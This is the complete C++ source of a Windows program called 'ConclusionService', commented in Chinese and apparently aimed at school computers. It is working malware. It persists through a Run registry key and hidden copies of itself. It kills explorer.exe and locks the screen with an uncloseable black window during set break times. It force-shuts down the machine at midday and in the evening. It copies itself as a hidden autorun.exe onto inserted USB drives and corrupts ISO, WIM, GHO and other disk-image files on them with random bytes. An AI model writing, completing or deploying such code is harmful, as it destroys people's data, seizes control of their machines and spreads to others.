// ConclusionService.cpp
// 使用 MinGW-w64 (MSVCRT) 编译:
//   g++ -m64 -static -mwindows -o ConclusionService.exe ConclusionService.cpp -ladvapi32 -lshell32
// 程序无需管理员权限，兼容 Windows 7/8/10/11

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

// 必须定义 _WIN32_WINNT 为 0x0601 才能使用 IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS 等
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winioctl.h>       // 卷、磁盘相关 IOCTL
#include <ntddstor.h>       // STORAGE_PROPERTY_QUERY 等
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <cstdio>
#include <ctime>
#include <vector>
#include <string>
#include <set>
#include <algorithm>        // std::min

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ------------------------------------------------------------
// 配置
// ------------------------------------------------------------
const wchar_t* TARGET_DIR_NAME  = L"ConclusionService";
const wchar_t* TARGET_EXE_NAME  = L"ConclusionService.exe";
const wchar_t* FIRST_RUN_MARKER = L"firstrun.dat";
const int CHECK_INTERVAL_MS     = 5000;      // 主循环间隔
const int INITIAL_DELAY_SEC     = 300;        // 首次 5 分钟冷却
const int SHUTDOWN_DELAY_SEC    = 30;         // 关机前等待

// 课间时间段 (杀桌面/黑窗)
struct TimePeriod {
    int startH, startM;
    int endH,   endM;
};
const TimePeriod breakPeriods[] = {
    { 8,45,  8,53 },
    { 9,40, 10, 8 },
    {10,55, 11, 3 },
    {14,25, 14,33 },
    {15,20, 15,33 },
    {16,20, 16,40 }
};

// 午休/晚休 (关机)
const TimePeriod shutdownPeriods[] = {
    {11,50, 13,38 },
    {17,15, 18,28 }
};

// 映像文件扩展名
const wchar_t* imgExts[] = {
    L"iso", L"wim", L"esd", L"gho", L"vhd", L"vhdx", L"img", L"swm", L"vmdk", L"qcow2"
};
const int imgExtCount = sizeof(imgExts) / sizeof(imgExts[0]);

// ------------------------------------------------------------
// 全局
// ------------------------------------------------------------
HINSTANCE g_hInst;
HWND     g_blackWnd = NULL;
bool     g_shutdownPending = false;
DWORD    g_shutdownTick = 0;

// ------------------------------------------------------------
// 工具
// ------------------------------------------------------------
std::wstring GetExePath() {
    wchar_t buf[MAX_PATH];
    GetModuleFileNameW(NULL, buf, MAX_PATH);
    return buf;
}

std::wstring GetTargetDir() {
    wchar_t appdata[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata)))
        return L"";
    return std::wstring(appdata) + L"\\" + TARGET_DIR_NAME;
}

std::wstring GetTargetExe() {
    return GetTargetDir() + L"\\" + TARGET_EXE_NAME;
}

std::wstring GetMarkerPath() {
    return GetTargetDir() + L"\\" + FIRST_RUN_MARKER;
}

bool IsRunningFromTarget() {
    std::wstring my = GetExePath();
    std::wstring target = GetTargetExe();
    return _wcsicmp(my.c_str(), target.c_str()) == 0;
}

bool DirCreate(const std::wstring& path) {
    for (size_t i = 0; i < path.size(); ++i) {
        if (path[i] == L'\\' || i == path.size() - 1) {
            std::wstring sub = path.substr(0, i + (i == path.size() - 1 ? 1 : 0));
            CreateDirectoryW(sub.c_str(), NULL);
        }
    }
    return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool FileCopy(const std::wstring& src, const std::wstring& dst) {
    std::wstring dir = dst.substr(0, dst.find_last_of(L'\\'));
    DirCreate(dir);
    return CopyFileW(src.c_str(), dst.c_str(), FALSE) != 0;
}

bool RegSetRun() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) return false;
    std::wstring exe = GetTargetExe();
    LONG res = RegSetValueExW(hKey, TARGET_DIR_NAME, 0, REG_SZ,
        (const BYTE*)exe.c_str(), (DWORD)((exe.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);
    return res == ERROR_SUCCESS;
}

// 结束其他 ConclusionService.exe
void KillOtherInstances() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD myPid = GetCurrentProcessId();
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, TARGET_EXE_NAME) == 0 && pe.th32ProcessID != myPid) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 1); CloseHandle(h); }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

// 首次运行标记
bool CreateFirstRunMarker() {
    std::wstring path = GetMarkerPath();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    FILETIME now;
    GetSystemTimeAsFileTime(&now);
    DWORD written;
    WriteFile(h, &now, sizeof(now), &written, NULL);
    CloseHandle(h);
    return true;
}

bool IsCooldownActive(DWORD& remainSec) {
    std::wstring path = GetMarkerPath();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;

    FILETIME installTime;
    DWORD read;
    BOOL ok = ReadFile(h, &installTime, sizeof(installTime), &read, NULL);
    CloseHandle(h);

    if (!ok || read != sizeof(installTime)) {
        DeleteFileW(path.c_str());
        return false;
    }

    FILETIME now;
    GetSystemTimeAsFileTime(&now);
    ULARGE_INTEGER ui1, ui2;
    ui1.LowPart = installTime.dwLowDateTime; ui1.HighPart = installTime.dwHighDateTime;
    ui2.LowPart = now.dwLowDateTime; ui2.HighPart = now.dwHighDateTime;
    ULONGLONG elapsed = (ui2.QuadPart - ui1.QuadPart) / 10000000ULL;

    if (elapsed >= INITIAL_DELAY_SEC) {
        DeleteFileW(path.c_str());
        return false;
    }
    remainSec = (DWORD)(INITIAL_DELAY_SEC - elapsed);
    return true;
}

void WaitCooldown() {
    DWORD remain;
    while (IsCooldownActive(remain)) {
        Sleep( std::min(remain * 1000, (DWORD)10000) );
    }
}

// 时间判断
bool InPeriod(const TimePeriod& p) {
    SYSTEMTIME t;
    GetLocalTime(&t);
    int now = t.wHour * 60 + t.wMinute;
    int start = p.startH * 60 + p.startM;
    int end = p.endH * 60 + p.endM;
    return now >= start && now <= end;
}

bool IsBreakTime() {
    for (auto& p : breakPeriods) if (InPeriod(p)) return true;
    return false;
}

bool IsShutdownTime() {
    for (auto& p : shutdownPeriods) if (InPeriod(p)) return true;
    return false;
}

// 关机
bool GetShutdownPrivilege() {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;
    TOKEN_PRIVILEGES tp;
    LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(tok);
    return true;
}

void Shutdown() {
    GetShutdownPrivilege();
    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE | EWX_POWEROFF,
                  SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
}

// U盘
std::set<wchar_t> GetRemovableDrives() {
    std::set<wchar_t> set;
    DWORD mask = GetLogicalDrives();
    for (wchar_t c = L'A'; c <= L'Z'; ++c) {
        if (mask & (1 << (c - L'A'))) {
            wchar_t root[4] = {c, L':', L'\\', 0};
            if (GetDriveTypeW(root) == DRIVE_REMOVABLE) set.insert(c);
        }
    }
    return set;
}

// 判断文件是否为映像
bool IsImageFile(const std::wstring& filename) {
    size_t dot = filename.rfind(L'.');
    if (dot == std::wstring::npos) return false;
    std::wstring ext = filename.substr(dot + 1);
    for (int i = 0; i < imgExtCount; ++i)
        if (_wcsicmp(ext.c_str(), imgExts[i]) == 0) return true;
    return false;
}

// 随机破坏文件
void DamageFile(const std::wstring& path) {
    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    LARGE_INTEGER sz;
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart < 4) { CloseHandle(h); return; }
    srand((unsigned)time(NULL) ^ GetCurrentProcessId());
    for (int i = 0; i < 5; ++i) {
        LARGE_INTEGER pos;
        pos.QuadPart = rand() % sz.QuadPart;
        SetFilePointerEx(h, pos, NULL, FILE_BEGIN);
        BYTE garbage = (BYTE)(rand() % 256);
        DWORD w;
        WriteFile(h, &garbage, 1, &w, NULL);
    }
    CloseHandle(h);
}

// 递归搜索并损坏映像文件
void DamageRecursive(const std::wstring& dir) {
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE f = FindFirstFileW(pattern.c_str(), &fd);
    if (f == INVALID_HANDLE_VALUE) return;
    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            DamageRecursive(full);
        } else {
            if (IsImageFile(fd.cFileName)) DamageFile(full);
        }
    } while (FindNextFileW(f, &fd));
    FindClose(f);
}

void ProcessDrive(wchar_t letter) {
    wchar_t root[4] = {letter, L':', L'\\', 0};
    // 复制自身为 autorun.exe
    std::wstring autorun = std::wstring(root) + L"autorun.exe";
    CopyFileW(GetExePath().c_str(), autorun.c_str(), FALSE);
    SetFileAttributesW(autorun.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    // 损坏映像
    DamageRecursive(root);
}

// 枚举所有卷 GUID，检查是否属于可移动磁盘，并损坏其中文件
void ProcessVolumes() {
    wchar_t volName[MAX_PATH];
    HANDLE h = FindFirstVolumeW(volName, MAX_PATH);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        std::wstring vol = volName;  // 形如 \\?\Volume{xxx}\
        if (!vol.empty() && vol.back() == L'\\') vol.pop_back();
        // 尝试打开卷，判断是否可移动
        HANDLE hVol = CreateFileW(vol.c_str(), 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hVol == INVALID_HANDLE_VALUE) continue;
        VOLUME_DISK_EXTENTS vde;
        DWORD rb;
        BOOL ok = DeviceIoControl(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
            NULL, 0, &vde, sizeof(vde), &rb, NULL);
        CloseHandle(hVol);
        if (!ok || vde.NumberOfDiskExtents < 1) continue;

        wchar_t diskPath[64];
        swprintf(diskPath, 64, L"\\\\.\\PhysicalDrive%u", vde.Extents[0].DiskNumber);
        HANDLE hDisk = CreateFileW(diskPath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hDisk == INVALID_HANDLE_VALUE) continue;
        STORAGE_PROPERTY_QUERY q = {};
        q.PropertyId = StorageDeviceProperty;
        q.QueryType = PropertyStandardQuery;
        STORAGE_DEVICE_DESCRIPTOR desc = {};
        DWORD size = sizeof(desc);
        ok = DeviceIoControl(hDisk, IOCTL_STORAGE_QUERY_PROPERTY,
            &q, sizeof(q), &desc, sizeof(desc), &rb, NULL);
        CloseHandle(hDisk);
        if (ok && desc.RemovableMedia) {
            // 可移动磁盘的无盘符卷，尝试损坏映像
            std::wstring root = vol + L"\\";
            DamageRecursive(root);
        }
    } while (FindNextVolumeW(h, volName, MAX_PATH));
    FindVolumeClose(h);
}

void HandleNewDrives(const std::set<wchar_t>& newDrives) {
    for (wchar_t d : newDrives) ProcessDrive(d);
    ProcessVolumes();  // 同时处理无盘符卷
}

// ------------------------------------------------------------
// 黑窗
// ------------------------------------------------------------
LRESULT CALLBACK BlackWndProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(hWnd, &ps);
        RECT rc; GetClientRect(hWnd, &rc);
        HBRUSH br = CreateSolidBrush(RGB(0, 0, 0));
        FillRect(dc, &rc, br);
        DeleteObject(br);
        EndPaint(hWnd, &ps);
        return 0;
    }
    case WM_CLOSE: return 0;
    case WM_DESTROY: return 0;
    case WM_KEYDOWN:
        if (wp == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 0; // 禁止 Alt+F4
        break;
    }
    return DefWindowProcW(hWnd, msg, wp, lp);
}

void ShowBlackWindow() {
    if (g_blackWnd) {
        ShowWindow(g_blackWnd, SW_SHOW);
        SetWindowPos(g_blackWnd, HWND_TOPMOST, 0,0,0,0, SWP_NOMOVE|SWP_NOSIZE|SWP_SHOWWINDOW);
        return;
    }
    WNDCLASSW wc = {};
    wc.lpfnWndProc = BlackWndProc;
    wc.hInstance = g_hInst;
    wc.lpszClassName = L"ConclusionService_BlackWnd";
    RegisterClassW(&wc);

    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    g_blackWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, L"", WS_POPUP,
        x, y, w, h, NULL, NULL, g_hInst, NULL);
    if (g_blackWnd) ShowWindow(g_blackWnd, SW_SHOW);
    ShellExecuteW(NULL, L"open", L"taskkill.exe",L"/f /im explorer.exe",NULL, SW_HIDE);
}

void HideBlackWindow() {
    if (g_blackWnd) { DestroyWindow(g_blackWnd); g_blackWnd = NULL; }
    ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOW);
}

void KeepFocus() {
    if (g_blackWnd && IsWindow(g_blackWnd)) {
        SetForegroundWindow(g_blackWnd);
        SetWindowPos(g_blackWnd, HWND_TOPMOST, 0,0,0,0, SWP_NOMOVE|SWP_NOSIZE|SWP_SHOWWINDOW);
    }
}

// ------------------------------------------------------------
// WinMain
// ------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    g_hInst = hInst;

    // 如果不在目标路径，执行安装
    if (!IsRunningFromTarget()) {
        KillOtherInstances();
        if (!FileCopy(GetExePath(), GetTargetExe())) return 1;
        // D盘备份
        std::wstring dCopy = L"D:\\" + std::wstring(TARGET_EXE_NAME);
        CopyFileW(GetExePath().c_str(), dCopy.c_str(), FALSE);
        RegSetRun();
        // 启动目标并退出
        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi = {};
        if (CreateProcessW(GetTargetExe().c_str(), NULL, NULL, NULL, FALSE,
            0, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        return 0;
    }

    // 目标路径运行，结束其他实例
    KillOtherInstances();

    // 首次运行冷却
    if (GetFileAttributesW(GetMarkerPath().c_str()) == INVALID_FILE_ATTRIBUTES) {
        CreateFirstRunMarker();
        WaitCooldown();
    } else {
        // 标记存在但可能已过期？IsCooldownActive 会在过期时删除
        DWORD remain;
        if (IsCooldownActive(remain)) WaitCooldown();
    }

    // 隐藏消息窗口
    WNDCLASSW wc2 = {};
    wc2.lpfnWndProc = DefWindowProcW;
    wc2.hInstance = g_hInst;
    wc2.lpszClassName = L"ConclusionService_Msg";
    RegisterClassW(&wc2);
    HWND msgWnd = CreateWindowExW(0, wc2.lpszClassName, L"", 0,
        0,0,0,0, NULL, NULL, g_hInst, NULL);
    SetTimer(msgWnd, 1, CHECK_INTERVAL_MS, NULL);

    std::set<wchar_t> known = GetRemovableDrives();
    bool breakActive = false;

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        if (msg.message == WM_TIMER && msg.wParam == 1) {
            bool inBreak = IsBreakTime();
            bool inShut = IsShutdownTime();

            // 黑窗
            if (inBreak) {
                if (!breakActive) { ShowBlackWindow(); breakActive = true; }
                KeepFocus();
            } else {
                if (breakActive) { HideBlackWindow(); breakActive = false; }
            }

            // 关机
            if (inShut && !g_shutdownPending) {
                g_shutdownPending = true;
                g_shutdownTick = GetTickCount();
            }
            if (g_shutdownPending) {
                if (!inShut) g_shutdownPending = false;
                else if ((GetTickCount() - g_shutdownTick) / 1000 >= SHUTDOWN_DELAY_SEC) {
                    Shutdown();
                    g_shutdownPending = false; // 关机失败则重试
                }
            }

            // U盘
            std::set<wchar_t> cur = GetRemovableDrives();
            std::set<wchar_t> added;
            for (auto d : cur) if (known.find(d) == known.end()) added.insert(d);
            if (!added.empty()) HandleNewDrives(added);
            known = cur;
        }
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
